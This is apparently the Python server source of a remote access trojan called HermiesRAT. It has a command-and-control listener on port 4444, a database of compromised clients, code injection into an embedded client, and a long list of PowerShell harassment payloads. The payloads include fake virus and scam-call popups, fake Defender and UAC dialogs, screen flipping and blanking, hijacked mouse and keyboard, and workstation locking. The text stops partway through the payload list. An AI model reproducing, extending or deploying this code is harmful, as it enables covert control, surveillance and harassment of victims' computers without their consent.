#
#  HermiesRAT-Bata-1.
#  Structure:
#    [IMPORTS]           stdlib + third-party imports
#    [CONFIG]            runtime config load/save
#    [DATABASE]          SQLite client persistence layer
#    [MODULES]           plugin module scanner and injector
#    [SCRIPTS]           script folder scanner
#    [THEME]             colour presets and font constants
#    [TROLL_PAYLOADS]    built-in one-shot troll commands
#    [AUTH]              HMAC-based client auth
#    [MESSAGING]         send_msg / recv_msg / _recvall helpers
#    [SERVER]            accept loop and client registration
#    [CLIENT_TEMPLATE]   embedded client source (formatted string)
#    [GUI]               HermiesGUI tk.Tk subclass
#      _build_clients_tab
#      _build_datalogs_tab
#      _build_logs_tab
#      _build_screen_tab
#      _build_camera_tab
#      _build_task_tab
#      _build_files_tab
#      _build_payloadCenter  
#      _build_builder_tab
#      _build_shell_tab
#      _build_mic_tab
#      _build_map_tab
#      _build_settings_tab
#      _build_custom_tab
#    [ENTRYPOINT]        __main__ block
#

#  [IMPORTS]
import shlex
import socket, threading, os, json, struct, base64, io, time, hmac, hashlib, secrets, ast, sqlite3
import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext, messagebox, colorchooser
from PIL import Image, ImageTk


#  [CONFIG / GLOBALS]
HOST = "0.0.0.0"
PORT = 4444
CHUNK = 65536

CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hermies_config.json")
DB_PATH_DEFAULT    = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hermies_clients.db")
PAYLOADS_FILE      = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hermies_payloads.json")

SHARED_SECRET = b""
AUTH_TIMEOUT  = 10

_config = {}


#  [CONFIG]
def _load_config():
    global SHARED_SECRET, _config, _active_secret
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as fh:
                _config = json.load(fh)
            secret_b64 = _config.get("hmac_secret", "")
            if secret_b64:
                SHARED_SECRET = secret_b64.encode()
                _active_secret = SHARED_SECRET
                print(f"[config] loaded HMAC secret from {CONFIG_FILE}")
        except Exception as e:
            print(f"[config] load error: {e}")
    else:
        print(f"[config] no config file found at {CONFIG_FILE}")

def _save_config():
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as fh:
            json.dump(_config, fh, indent=2)
        print(f"[config] saved to {CONFIG_FILE}")
    except Exception as e:
        print(f"[config] save error: {e}")


#  [PAYLOAD CENTER] 
_payload_library = []   # list of dicts: {name, shell, tags, code}

def _pc_load():
    global _payload_library
    if os.path.exists(PAYLOADS_FILE):
        try:
            with open(PAYLOADS_FILE, "r", encoding="utf-8") as fh:
                data = json.load(fh)
            if isinstance(data, list):
                _payload_library = data
                print(f"[payloads] loaded {len(_payload_library)} payload(s) from {PAYLOADS_FILE}")
                return
        except Exception as e:
            print(f"[payloads] load error: {e}")
    _payload_library = []

def _pc_save():
    try:
        with open(PAYLOADS_FILE, "w", encoding="utf-8") as fh:
            json.dump(_payload_library, fh, indent=2)
    except Exception as e:
        print(f"[payloads] save error: {e}")


#  [DATABASE]
_db_conn = None

def _db_init(path):
    global _db_conn
    try:
        _db_conn = sqlite3.connect(path, check_same_thread=False)
        _db_conn.execute("""
            CREATE TABLE IF NOT EXISTS clients (
                ip TEXT PRIMARY KEY,
                label TEXT,
                user TEXT,
                os TEXT,
                first_seen TEXT,
                last_seen TEXT,
                note TEXT
            )
        """)
        _db_conn.commit()
        print(f"[db] initialized at {path}")
        return True
    except Exception as e:
        print(f"[db] init error: {e}")
        return False

def _db_close():
    global _db_conn
    if _db_conn:
        try:
            _db_conn.close()
        except Exception:
            pass
        _db_conn = None

def _db_upsert(ip, label, user="", os_str=""):
    if not _db_conn:
        return
    now = time.strftime("%Y-%m-%d %H:%M:%S")
    try:
        _db_conn.execute("""
            INSERT INTO clients (ip, label, user, os, first_seen, last_seen, note)
            VALUES (?, ?, ?, ?, ?, ?, '')
            ON CONFLICT(ip) DO UPDATE SET
                label=excluded.label,
                user=excluded.user,
                os=excluded.os,
                last_seen=excluded.last_seen
        """, (ip, label, user, os_str, now, now))
        _db_conn.commit()
    except Exception as e:
        print(f"[db] upsert error: {e}")

def _db_fetch_all():
    if not _db_conn:
        return []
    try:
        cur = _db_conn.execute(
            "SELECT ip, label, user, os, first_seen, last_seen, note FROM clients ORDER BY last_seen DESC"
        )
        return cur.fetchall()
    except Exception as e:
        print(f"[db] fetch error: {e}")
        return []

def _db_delete(ip):
    if not _db_conn:
        return
    try:
        _db_conn.execute("DELETE FROM clients WHERE ip=?", (ip,))
        _db_conn.commit()
    except Exception as e:
        print(f"[db] delete error: {e}")

def _db_update_note(ip, note):
    if not _db_conn:
        return
    try:
        _db_conn.execute("UPDATE clients SET note=? WHERE ip=?", (note, ip))
        _db_conn.commit()
    except Exception as e:
        print(f"[db] note error: {e}")


#  [MODULES] 
MODULE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "src", "command", "modules")
_loaded_modules = {}

def _scan_modules():
    _loaded_modules.clear()
    if not os.path.isdir(MODULE_DIR):
        print(f"[modules] dir not found: {MODULE_DIR}")
        return
    found = 0
    for fname in sorted(os.listdir(MODULE_DIR)):
        if not fname.endswith(".py") or fname.startswith("_"):
            continue
        path = os.path.join(MODULE_DIR, fname)
        try:
            with open(path, "r", encoding="utf-8") as fh:
                src = fh.read()
            tree = ast.parse(src)
            meta = None
            for node in ast.walk(tree):
                if isinstance(node, ast.Assign):
                    for tgt in node.targets:
                        if isinstance(tgt, ast.Name) and tgt.id == "META":
                            meta = ast.literal_eval(node.value)
            if meta and "name" in meta:
                _loaded_modules[meta["name"]] = {"meta": meta, "source": src, "path": path}
                found += 1
            else:
                print(f"[modules] skipped {fname}: no META dict with 'name' key")
        except Exception as e:
            print(f"[modules] parse error {fname}: {e}")
    print(f"[modules] loaded {found} module(s) from {MODULE_DIR}")

def _build_module_injection(selected_names):
    parts = []
    for name in selected_names:
        entry = _loaded_modules.get(name)
        if not entry:
            continue
        src   = entry["source"]
        lines = []
        skip  = False
        for line in src.splitlines():
            stripped = line.lstrip()
            if stripped.startswith("META"):
                skip = True
            if skip:
                if (not stripped.startswith("META") and not stripped.startswith("#")
                        and line and line[0] not in (" ", "\t", "}", "]", ")") and stripped):
                    skip = False
                    lines.append(line)
                continue
            lines.append(line)
        body = "\n".join(lines)
        body = "\n" + body
        body = body.replace("\ndef run(",       f"\ndef _mod_{name}(")
        body = body.replace("\nasync def run(", f"\nasync def _mod_{name}(")
        parts.append(f"# module: {name}\n{body.strip()}\n_MODULES[{name!r}] = _mod_{name}\n")
    return "\n".join(parts)


#  [SCRIPTS] 
SCRIPT_BASE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "src", "modules")
_EXT_SHELL = {".ps1": "powershell", ".sh": "bash", ".bat": "cmd"}

def _scan_scripts():
    result = {}
    if not os.path.isdir(SCRIPT_BASE_DIR):
        print(f"[scripts] dir not found: {SCRIPT_BASE_DIR}")
        return result
    for entry in sorted(os.scandir(SCRIPT_BASE_DIR), key=lambda e: e.name.lower()):
        if not entry.is_dir():
            continue
        scripts = []
        try:
            for f in sorted(os.scandir(entry.path), key=lambda e: e.name.lower()):
                if not f.is_file():
                    continue
                ext = os.path.splitext(f.name)[1].lower()
                if ext not in _EXT_SHELL:
                    continue
                scripts.append({"name": f.name, "path": f.path,
                                 "shell": _EXT_SHELL[ext], "size": f.stat().st_size})
        except OSError as e:
            print(f"[scripts] scan error in {entry.path}: {e}")
        if scripts:
            result[entry.name] = scripts
    print(f"[scripts] found {len(result)} folder(s) in {SCRIPT_BASE_DIR}")
    return result


#  [THEME] 
THEME_PRESETS = {
    "orange": {
        "BG": "#0f0f0f", "BG2": "#1a1a1a", "BG3": "#242424", "BG4": "#2e2e2e",
        "FG": "#d4d4d4", "FG_DIM": "#777777",
        "ACCENT": "#ff6600", "ACCENT2": "#ff8833",
        "RED": "#e05252", "GREEN": "#4caf50",
        "NAV_BG": "#cc5500", "HDR_FG": "#000000",
        "GRID_BDR": "#cc4400", "CELL_BG": "#141414",
        "STARS_BG": False,
    },
    "green": {
        "BG": "#0a0f0a", "BG2": "#111a11", "BG3": "#1a2a1a", "BG4": "#253525",
        "FG": "#c8f0c8", "FG_DIM": "#4a7a4a",
        "ACCENT": "#00e676", "ACCENT2": "#69ff9f",
        "RED": "#ef5350", "GREEN": "#00e676",
        "NAV_BG": "#0d2010", "HDR_FG": "#000000",
        "GRID_BDR": "#1b4d1b", "CELL_BG": "#0a130a",
        "STARS_BG": False,
    },
    "black": {
        "BG": "#111111", "BG2": "#1a1a1a", "BG3": "#222222", "BG4": "#2e2e2e",
        "FG": "#e0e0e0", "FG_DIM": "#666666",
        "ACCENT": "#d0d0d0", "ACCENT2": "#ffffff",
        "RED": "#cc4444", "GREEN": "#4caf50",
        "NAV_BG": "#171717", "HDR_FG": "#0a0a0a",
        "GRID_BDR": "#333333", "CELL_BG": "#0e0e0e",
        "STARS_BG": False,
    },
    "purple": {
        "BG": "#0d0a14", "BG2": "#160f22", "BG3": "#1f1530", "BG4": "#2a1d40",
        "FG": "#ddd0f5", "FG_DIM": "#7a6a99",
        "ACCENT": "#b388ff", "ACCENT2": "#d0aaff",
        "RED": "#e05252", "GREEN": "#69ff9f",
        "NAV_BG": "#120d1e", "HDR_FG": "#0a0a0a",
        "GRID_BDR": "#3d2a60", "CELL_BG": "#0d0a14",
        "STARS_BG": False,
    },
    "pink": {
        "BG": "#140a10", "BG2": "#1e0f18", "BG3": "#2d1525", "BG4": "#3d1c32",
        "FG": "#f5d0e8", "FG_DIM": "#996680",
        "ACCENT": "#ff69b4", "ACCENT2": "#ffaad4",
        "RED": "#ff4081", "GREEN": "#69ff9f",
        "NAV_BG": "#1e0d18", "HDR_FG": "#0a0a0a",
        "GRID_BDR": "#6d2050", "CELL_BG": "#140a10",
        "STARS_BG": False,
    },
    "stars": {
        "BG": "#050510", "BG2": "#0a0a1a", "BG3": "#10101f", "BG4": "#16162a",
        "FG": "#d0d8f0", "FG_DIM": "#606880",
        "ACCENT": "#7ec8e3", "ACCENT2": "#b0e0f8",
        "RED": "#e05252", "GREEN": "#69ff9f",
        "NAV_BG": "#07071a", "HDR_FG": "#000000",
        "GRID_BDR": "#1a1a35", "CELL_BG": "#050510",
        "STARS_BG": True,
    },
}

THEME    = dict(THEME_PRESETS["black"])
FONT     = ("Segoe UI", 9)
FONT_SML = ("Consolas", 9)
FONT_MON = ("Consolas", 10)

STARS_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                          "src", "icons", "background", "stars.png")


#  [TROLL_PAYLOADS]  categorized dict  {category: [(label, shell, cmd), ...]}
_DEVMODE_TYPE = (
    "$code=@'\n"
    "using System;using System.Runtime.InteropServices;\n"
    "public struct DEVMODE{"
    "[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmDeviceName;"
    "public short dmSpecVersion,dmDriverVersion,dmSize,dmDriverExtra;public int dmFields;"
    "public int dmPositionX,dmPositionY,dmDisplayOrientation;public int dmDisplayFixedOutput;"
    "public short dmColor,dmDuplex,dmYResolution,dmTTOption,dmCollate;"
    "[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmFormName;"
    "public short dmLogPixels;"
    "public int dmBitsPerPel,dmPelsWidth,dmPelsHeight,dmDisplayFlags,dmDisplayFrequency;}\n"
    "public class Disp{"
    "[DllImport(\"user32.dll\")]public static extern bool EnumDisplaySettings(string d,int m,ref DEVMODE dm);"
    "[DllImport(\"user32.dll\")]public static extern int ChangeDisplaySettings(ref DEVMODE dm,int f);}\n"
    "'@\nAdd-Type -TypeDefinition $code -ErrorAction SilentlyContinue;"
    "$dm=New-Object DEVMODE;"
    "$dm.dmSize=[System.Runtime.InteropServices.Marshal]::SizeOf($dm);"
    "[Disp]::EnumDisplaySettings($null,-1,[ref]$dm);"
)
_COLMAT_TYPE = (
    "$code=@'\n"
    "using System;using System.Runtime.InteropServices;\n"
    "public struct ColorMatrix{public float m00,m01,m02,m03,m04,m10,m11,m12,m13,m14,"
    "m20,m21,m22,m23,m24,m30,m31,m32,m33,m34,m40,m41,m42,m43,m44;}\n"
    "public class Mag{"
    "[DllImport(\"magnification.dll\")]public static extern bool MagInitialize();"
    "[DllImport(\"magnification.dll\")]"
    "public static extern bool MagSetFullscreenColorEffect(ref ColorMatrix m);}\n"
    "'@\nAdd-Type -TypeDefinition $code -ErrorAction SilentlyContinue;"
    "[Mag]::MagInitialize()|Out-Null;$m=New-Object ColorMatrix;"
)

TROLL_PAYLOADS = {
    "🔊  Audio": [
        ("beep",              "powershell",
         "[console]::beep(1000,500)"),
        ("exclamation wav",   "powershell",
         "(New-Object Media.SoundPlayer 'C:\\Windows\\Media\\Windows Exclamation.wav').PlaySync()"),
        ("critical stop x10", "powershell",
         "1..10|%{(New-Object Media.SoundPlayer"
         " 'C:\\Windows\\Media\\Windows Critical Stop.wav').PlaySync();Start-Sleep 2}"),
        ("ding",              "powershell",
         "(New-Object Media.SoundPlayer 'C:\\Windows\\Media\\Windows Ding.wav').PlaySync()"),
        ("logon sound",       "powershell",
         "(New-Object Media.SoundPlayer 'C:\\Windows\\Media\\Windows Logon.wav').PlaySync()"),
        ("random wav loop",   "powershell",
         "while($true){$w=(Get-ChildItem 'C:\\Windows\\Media\\*.wav'|Get-Random).FullName;"
         "(New-Object Media.SoundPlayer $w).PlaySync();Start-Sleep 5}"),
        ("siren loop",        "powershell",
         "while($true){[console]::beep(1200,200);[console]::beep(600,200)}"),
        ("beep on the minute","powershell",
         "while($true){$s=60-(Get-Date).Second;Start-Sleep $s;[console]::beep(2000,1000)}"),
        ("rickroll beep",     "powershell",
         "foreach($n in 523,523,523,523,587,659,587,523,587,659,523)"
         "{[console]::beep($n,200);Start-Sleep -Milliseconds 50}"),
        ("mute toggle",       "powershell",
         "(New-Object -ComObject WScript.Shell).SendKeys([char]173)"),
        ("max volume",        "powershell",
         "$sig='[DllImport(\"user32.dll\")]public static extern void keybd_event(byte k,byte s,int f,int e);';"
         "Add-Type -MemberDefinition $sig -Name V -Namespace W -ErrorAction SilentlyContinue;"
         "1..50|%{[W.V]::keybd_event(0xAF,0,0,0);[W.V]::keybd_event(0xAF,0,2,0);"
         "Start-Sleep -Milliseconds 30}"),
        ("min volume",        "powershell",
         "$sig='[DllImport(\"user32.dll\")]public static extern void keybd_event(byte k,byte s,int f,int e);';"
         "Add-Type -MemberDefinition $sig -Name V -Namespace W -ErrorAction SilentlyContinue;"
         "1..50|%{[W.V]::keybd_event(0xAE,0,0,0);[W.V]::keybd_event(0xAE,0,2,0);"
         "Start-Sleep -Milliseconds 30}"),
        ("vol toggle x20",    "powershell",
         "$o=New-Object -ComObject WScript.Shell;"
         "1..20|%{$o.SendKeys([char]173);Start-Sleep -Milliseconds 50}"),
        ("speak hello",       "powershell",
         "(New-Object -ComObject SAPI.SpVoice).Speak('Hello there')"),
        ("speak creepy",      "powershell",
         "$v=New-Object -ComObject SAPI.SpVoice;$v.Rate=-5;$v.Speak('I see you')"),
        ("speak full vol",    "powershell",
         "$v=New-Object -ComObject SAPI.SpVoice;$v.Volume=100;$v.Speak('Look behind you')"),
        ("speak username",    "powershell",
         "(New-Object -ComObject SAPI.SpVoice).Speak('Hello '+$env:USERNAME)"),
        ("speak time loop",   "powershell",
         "while($true){(New-Object -ComObject SAPI.SpVoice).Speak("
         "(Get-Date).ToString('h:mm tt'));Start-Sleep 60}"),
        ("speak random loop", "powershell",
         "$p=@('hello','what are you doing','boo','did you hear that','I am watching');"
         "while($true){(New-Object -ComObject SAPI.SpVoice).Speak($p|Get-Random);"
         "Start-Sleep (Get-Random -Min 10 -Max 30)}"),
        ("speak processes",   "powershell",
         "Get-Process|%{(New-Object -ComObject SAPI.SpVoice).Speak($_.ProcessName);Start-Sleep 1}"),
        ("speak clipboard",   "powershell",
         "$v=New-Object -ComObject SAPI.SpVoice;$v.Speak([string](Get-Clipboard))"),
        ("popup watch msg",   "powershell",
         "Add-Type -AssemblyName System.Windows.Forms;"
         "1..10|%{[System.Windows.Forms.MessageBox]::Show("
         "'Hello. I have been watching you. You should close some of those tabs.','...',"
         "[System.Windows.Forms.MessageBoxButtons]::OK,"
         "[System.Windows.Forms.MessageBoxIcon]::Warning)|Out-Null}"),
    ],

    "🖼  Wallpaper": [
        ("random wallpaper",  "powershell",
         "$img=(Get-ChildItem 'C:\\Windows\\Web\\Wallpaper'"
         " -Recurse -Include *.jpg,*.png|Get-Random).FullName;"
         "Add-Type -TypeDefinition 'using System.Runtime.InteropServices;"
         "public class WP{[DllImport(\"user32.dll\")]"
         "public static extern int SystemParametersInfo(int u,int w,string p,int f);}'"
         " -EA SilentlyContinue;[WP]::SystemParametersInfo(20,0,$img,3)"),
        ("rotate wallpaper",  "powershell",
         "Add-Type -TypeDefinition 'using System.Runtime.InteropServices;"
         "public class WPR{[DllImport(\"user32.dll\")]"
         "public static extern int SystemParametersInfo(int u,int w,string p,int f);}'"
         " -EA SilentlyContinue;"
         "while($true){$i=(Get-ChildItem 'C:\\Windows\\Web\\Wallpaper'"
         " -Recurse -Include *.jpg,*.png|Get-Random).FullName;"
         "[WPR]::SystemParametersInfo(20,0,$i,3);Start-Sleep 10}"),
        ("restore wallpaper", "powershell",
         "Add-Type -TypeDefinition 'using System.Runtime.InteropServices;"
         "public class WPX{[DllImport(\"user32.dll\")]"
         "public static extern int SystemParametersInfo(int u,int w,string p,int f);}'"
         " -EA SilentlyContinue;"
         "[WPX]::SystemParametersInfo(20,0,"
         "'C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg',3)"),
        ("tile wallpaper",    "powershell",
         "Set-ItemProperty 'HKCU:\\Control Panel\\Desktop' -Name WallpaperStyle -Value '0';"
         "Set-ItemProperty 'HKCU:\\Control Panel\\Desktop' -Name TileWallpaper -Value '1'"),
        ("stretch wallpaper", "powershell",
         "Set-ItemProperty 'HKCU:\\Control Panel\\Desktop' -Name WallpaperStyle -Value '2';"
         "Set-ItemProperty 'HKCU:\\Control Panel\\Desktop' -Name TileWallpaper -Value '0'"),
        ("giant icons",       "powershell",
         "Set-ItemProperty"
         " 'HKCU:\\Software\\Microsoft\\Windows\\Shell\\Bags\\1\\Desktop'"
         " -Name IconSize -Value 256"),
        ("restore icons",     "powershell",
         "Set-ItemProperty"
         " 'HKCU:\\Software\\Microsoft\\Windows\\Shell\\Bags\\1\\Desktop'"
         " -Name IconSize -Value 48"),
        ("bubbles screensaver","powershell",
         "Set-ItemProperty 'HKCU:\\Control Panel\\Desktop'"
         " -Name SCRNSAVE.EXE -Value 'C:\\Windows\\System32\\Bubbles.scr';"
         "Set-ItemProperty 'HKCU:\\Control Panel\\Desktop'"
         " -Name ScreenSaveTimeOut -Value '60'"),
        ("disable screensaver","powershell",
         "Set-ItemProperty 'HKCU:\\Control Panel\\Desktop' -Name SCRNSAVE.EXE -Value ''"),
    ],

    "🖱  Cursor": [
        ("swap mouse",        "powershell",
         "$sig='[DllImport(\"user32.dll\")]public static extern bool SwapMouseButton(bool b);';"
         "Add-Type -MemberDefinition $sig -Name M -Namespace W -ErrorAction SilentlyContinue;"
         "[W.M]::SwapMouseButton($true)|Out-Null"),
        ("unswap mouse",      "powershell",
         "$sig='[DllImport(\"user32.dll\")]public static extern bool SwapMouseButton(bool b);';"
         "Add-Type -MemberDefinition $sig -Name M -Namespace W -ErrorAction SilentlyContinue;"
         "[W.M]::SwapMouseButton($false)|Out-Null"),
        ("move cursor",       "powershell",
         "$sig='[DllImport(\"user32.dll\")]public static extern bool SetCursorPos(int x,int y);';"
         "Add-Type -MemberDefinition $sig -Name C -Namespace W -ErrorAction SilentlyContinue;"
         "1..100|%{[W.C]::SetCursorPos((Get-Random -Max 1920),(Get-Random -Max 1080));"
         "Start-Sleep -Milliseconds 100}"),
        ("random clicks",     "powershell",
         "$sig='[DllImport(\"user32.dll\")]"
         "public static extern void mouse_event(int f,int x,int y,int d,int e);';"
         "Add-Type -MemberDefinition $sig -Name M2 -Namespace W -ErrorAction SilentlyContinue;"
         "1..30|%{[W.M2]::mouse_event(2,0,0,0,0);[W.M2]::mouse_event(4,0,0,0,0);"
         "Start-Sleep -Milliseconds 500}"),
        ("max speed",         "powershell",
         "Set-ItemProperty 'HKCU:\\Control Panel\\Mouse' -Name MouseSensitivity -Value '20'"),
        ("min speed",         "powershell",
         "Set-ItemProperty 'HKCU:\\Control Panel\\Mouse' -Name MouseSensitivity -Value '1'"),
        ("restore speed",     "powershell",
         "Set-ItemProperty 'HKCU:\\Control Panel\\Mouse' -Name MouseSensitivity -Value '10'"),
        ("trails on",         "powershell",
         "Set-ItemProperty 'HKCU:\\Control Panel\\Mouse' -Name MouseTrails -Value '7'"),
        ("trails off",        "powershell",
         "Set-ItemProperty 'HKCU:\\Control Panel\\Mouse' -Name MouseTrails -Value '0'"),
        ("slowest dbl-click", "powershell",
         "Set-ItemProperty 'HKCU:\\Control Panel\\Mouse' -Name DoubleClickSpeed -Value '900'"),
        ("fastest dbl-click", "powershell",
         "Set-ItemProperty 'HKCU:\\Control Panel\\Mouse' -Name DoubleClickSpeed -Value '100'"),
        ("restore dbl-click", "powershell",
         "Set-ItemProperty 'HKCU:\\Control Panel\\Mouse' -Name DoubleClickSpeed -Value '500'"),
    ],

    "💬  Popups": [
        ("spam notepad",      "powershell",
         "1..20|%{Start-Process notepad.exe;Start-Sleep -Milliseconds 200}"),
        ("10 calculators",    "powershell",
         "1..10|%{Start-Process calc;Start-Sleep -Milliseconds 300}"),
        ("open task manager", "powershell",
         "Start-Process taskmgr"),
        ("open osk",          "powershell",
         "Start-Process osk"),
        ("open magnifier",    "powershell",
         "Start-Process magnify"),
        ("10 file explorers", "powershell",
         "1..10|%{Start-Process explorer;Start-Sleep -Milliseconds 200}"),
        ("open URLs",         "powershell",
         "'https://www.youtube.com/watch?v=dQw4w9WgXcQ',"
         "'https://neal.fun/infinite-craft/',"
         "'https://www.bing.com/search?q=am+i+hacked'|%{Start-Process $_}"),
        ("msgbox(1-800)",     "powershell",
         "Add-Type -AssemblyName System.Windows.Forms;"
         "[System.Windows.Forms.MessageBox]::Show("
         "'Your computer has a virus. Please call 1-800-HACKED immediately.','WARNING',"
         "[System.Windows.Forms.MessageBoxButtons]::OK,"
         "[System.Windows.Forms.MessageBoxIcon]::Error)"),
        ("fake restart msg",  "powershell",
         "Add-Type -AssemblyName PresentationFramework;"
         "[System.Windows.MessageBox]::Show("
         "'The system has detected a problem and must restart.','Error',0)"),
        ("fake Defender",     "powershell",
         "Add-Type -AssemblyName PresentationFramework;"
         "[System.Windows.MessageBox]::Show("
         "'Windows Defender found 3 threats.','Security Warning',48)"),
        ("fake update",       "powershell",
         "Add-Type -AssemblyName PresentationFramework;"
         "[System.Windows.MessageBox]::Show("
         "'Windows is updating. Do not turn off your computer.','Windows Update')"),
        ("fake UAC",          "powershell",
         "Add-Type -AssemblyName PresentationFramework;"
         "[System.Windows.MessageBox]::Show("
         "'Do you want to allow this app to make changes to your device?',"
         "'User Account Control')"),
        ("popup every 5 min", "powershell",
         "Add-Type -AssemblyName PresentationFramework;"
         "while($true){[System.Windows.MessageBox]::Show("
         "(@('Hi','Boo','Look','Troll','Did you hear that?')|Get-Random),'Surprise');"
         "Start-Sleep 300}"),
    ],

    "⌨  Keyboard": [
        ("wall of text",      "powershell",
         "$w=(New-Object -ComObject WScript.Shell);"
         "1..200|%{$w.SendKeys('ALL YOUR BASE ARE BELONG TO US ')}"),
        ("typing 'help'",     "powershell",
         "$w=(New-Object -ComObject WScript.Shell);Start-Sleep 2;"
         "foreach($c in 'PLEASE SEND HELP I AM TRAPPED IN THIS COMPUTER'.ToCharArray()){"
         "$w.SendKeys($c.ToString());Start-Sleep -Milliseconds 80}"),
        ("caps lock spam",    "powershell",
         "$w=(New-Object -ComObject WScript.Shell);"
         "1..20|%{$w.SendKeys('{CAPSLOCK}');Start-Sleep -Milliseconds 300}"),
        ("type lol x100",     "powershell",
         "$w=(New-Object -ComObject WScript.Shell);"
         "1..100|%{$w.SendKeys('lol ');Start-Sleep -Milliseconds 100}"),
        ("type current time", "powershell",
         "Add-Type -AssemblyName System.Windows.Forms;"
         "[System.Windows.Forms.SendKeys]::SendWait((Get-Date).ToString('h:mm tt'))"),
        ("press Enter loop",  "powershell",
         "Add-Type -AssemblyName System.Windows.Forms;"
         "while($true){[System.Windows.Forms.SendKeys]::SendWait('{ENTER}');Start-Sleep 2}"),
        ("press F5 loop",     "powershell",
         "Add-Type -AssemblyName System.Windows.Forms;"
         "while($true){[System.Windows.Forms.SendKeys]::SendWait('{F5}');Start-Sleep 3}"),
        ("press Escape loop", "powershell",
         "Add-Type -AssemblyName System.Windows.Forms;"
         "while($true){[System.Windows.Forms.SendKeys]::SendWait('{ESC}');Start-Sleep 2}"),
        ("lock workstation",  "cmd",
         "rundll32 user32.dll,LockWorkStation"),
    ],

    "🖥  Screen": [
        ("flip screen",       "powershell",
         _DEVMODE_TYPE +
         "$dm.dmFields=0x80;$dm.dmDisplayOrientation=2;"
         "[Disp]::ChangeDisplaySettings([ref]$dm,0)"),
        ("unflip screen",     "powershell",
         _DEVMODE_TYPE +
         "$dm.dmFields=0x80;$dm.dmDisplayOrientation=0;"
         "[Disp]::ChangeDisplaySettings([ref]$dm,0)"),
        ("flip 90°",          "powershell",
         _DEVMODE_TYPE +
         "$dm.dmFields=0x80;$dm.dmDisplayOrientation=1;"
         "[Disp]::ChangeDisplaySettings([ref]$dm,0)"),
        ("flip/unflip loop",  "powershell",
         _DEVMODE_TYPE +
         "while($true){$dm.dmFields=0x80;$dm.dmDisplayOrientation=2;"
         "[Disp]::ChangeDisplaySettings([ref]$dm,0);Start-Sleep 5;"
         "$dm.dmDisplayOrientation=0;"
         "[Disp]::ChangeDisplaySettings([ref]$dm,0);Start-Sleep 5}"),
        ("invert colors",     "powershell",
         _COLMAT_TYPE +
         "$m.m00=-1;$m.m11=-1;$m.m22=-1;$m.m33=1;$m.m44=1;"
         "$m.m04=1;$m.m14=1;$m.m24=1;"
         "[Mag]::MagSetFullscreenColorEffect([ref]$m)"),
        ("uninvert colors",   "powershell",
         _COLMAT_TYPE +
         "$m.m00=1;$m.m11=1;$m.m22=1;$m.m33=1;$m.m44=1;"
         "[Mag]::MagSetFullscreenColorEffect([ref]$m)"),
        ("high contrast on",  "powershell",
         "Set-ItemProperty"
         " 'HKCU:\\Control Panel\\Accessibility\\HighContrast' -Name Flags -Value '126'"),
        ("high contrast off", "powershell",
         "Set-ItemProperty"
         " 'HKCU:\\Control Panel\\Accessibility\\HighContrast' -Name Flags -Value '0'"),
        ("brightness 0",      "powershell",
         "(Get-CimInstance -Namespace root/WMI -ClassName WmiMonitorBrightnessMethods)"
         ".WmiSetBrightness(1,0)"),
        ("brightness 100",    "powershell",
         "(Get-CimInstance -Namespace root/WMI -ClassName WmiMonitorBrightnessMethods)"
         ".WmiSetBrightness(1,100)"),
        ("brightness 50",     "powershell",
         "(Get-CimInstance -Namespace root/WMI -ClassName WmiMonitorBrightnessMethods)"
         ".WmiSetBrightness(1,50)"),
        ("blink screen",      "powershell",
         "$b=(Get-CimInstance -Namespace root/WMI -ClassName WmiMonitorBrightnessMethods);"
         "while($true){$b.WmiSetBrightness(1,0);Start-Sleep -Milliseconds 500;"
         "$b.WmiSetBrightness(1,100);Start-Sleep -Milliseconds 500}"),
        ("screen off",        "powershell",
         "$sig='[DllImport(\"user32.dll\")]"
         "public static extern int SendMessage(int h,int m,int w,int l);';"
         "Add-Type -MemberDefinition $sig -Name SM -Namespace W -EA SilentlyContinue;"
         "[W.SM]::SendMessage(0xFFFF,0x0112,0xF170,2)"),
        ("toggle magnifier",  "powershell",
         "while($true){Start-Process magnify;Start-Sleep 10;"
         "Stop-Process -Name Magnify -EA SilentlyContinue;Start-Sleep 10}"),
    ],

    "📋  Taskbar": [
        ("taskbar hide",      "powershell",
         "$sig='[DllImport(\"user32.dll\")]public static extern IntPtr FindWindow(string c,string t);"
         "[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);';"
         "Add-Type -MemberDefinition $sig -Name TW -Namespace W -ErrorAction SilentlyContinue;"
         "$h=[W.TW]::FindWindow('Shell_TrayWnd',$null);[W.TW]::ShowWindow($h,0)"),
        ("taskbar show",      "powershell",
         "$sig='[DllImport(\"user32.dll\")]public static extern IntPtr FindWindow(string c,string t);"
         "[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);';"
         "Add-Type -MemberDefinition $sig -Name TW -Namespace W -ErrorAction SilentlyContinue;"
         "$h=[W.TW]::FindWindow('Shell_TrayWnd',$null);[W.TW]::ShowWindow($h,5)"),
        ("taskbar top",       "powershell",
         "$b=[byte[]](0x30,0,0,0,0xFE,0xFF,0xFF,0xFF,0x03,0,0,0,0x03,0,0,0,"
         "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,"
         "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);"
         "Set-ItemProperty"
         " 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3'"
         " -Name Settings -Value $b"),
        ("taskbar bottom",    "powershell",
         "$b=[byte[]](0x30,0,0,0,0xFE,0xFF,0xFF,0xFF,0x02,0,0,0,0x03,0,0,0,"
         "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,"
         "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);"
         "Set-ItemProperty"
         " 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3'"
         " -Name Settings -Value $b"),
